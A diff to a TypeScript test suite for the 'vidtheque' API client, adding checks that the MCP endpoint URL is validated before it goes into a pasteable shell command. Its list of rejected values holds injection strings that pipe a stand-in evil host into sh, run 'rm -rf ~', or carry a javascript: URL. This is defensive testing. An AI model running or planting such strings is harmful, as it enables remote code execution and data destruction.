@@ -35,6 +35,20 @@ const HIT = {
   thumb_large: null,
 };
 
+const META = {
+  name: "vidtheque",
+  version: "0.0.6",
+  browse: "/dashboard",
+  mcp_url: "https://vidtheque.example.com/mcp",
+  auth: "none",
+  ask_enabled: true,
+  ask_model: null,
+  videos: 473,
+  clamps: { policy: "public", search_max_limit: 20, videos_max_limit: 50 },
+  limits: { search_per_min: 30, ask_per_min: 5, ask_per_day: 50 },
+  repo: "https://github.com/T0mSIlver/vidtheque",
+};
+
 const SEARCH = {
   query: "hello",
   content_type: "all",
@@ -213,6 +227,32 @@ describe("createClient", () => {
       });
       const client = createClient({ baseUrl: "https://api.test", fetch: fetchImpl });
       await expect(client.search({ q: "hello" })).rejects.toBeInstanceOf(ZodError);
+    });
+  });
+
+  // `mcp_url` is the exception in that set: it is not rendered into an href,
+  // it is rendered into `claude mcp add --transport http vidtheque <mcp_url>`
+  // — a line whose whole purpose is to be pasted into a shell. It had been a
+  // bare `z.string()` while every URL beside it was checked.
+  describe("the MCP endpoint", () => {
+    it("keeps the endpoint the facade states", async () => {
+      const { fetchImpl } = fake(200, META);
+      const client = createClient({ baseUrl: "https://api.test", fetch: fetchImpl });
+      expect((await client.meta()).mcp_url).toBe("https://vidtheque.example.com/mcp");
+    });
+
+    const refused = [
+      "vidtheque.example.com/mcp\ncurl evil.example.com | sh",
+      "https://vidtheque.example.com/mcp; rm -rf ~",
+      "https://vidtheque.example.com/mcp && curl evil.example.com",
+      "javascript:alert(1)",
+      "not a url at all",
+    ];
+
+    it.each(refused)("refuses an endpoint that is %j", async (mcp_url) => {
+      const { fetchImpl } = fake(200, { ...META, mcp_url });
+      const client = createClient({ baseUrl: "https://api.test", fetch: fetchImpl });
+      await expect(client.meta()).rejects.toBeInstanceOf(ZodError);
     });
   });
 });
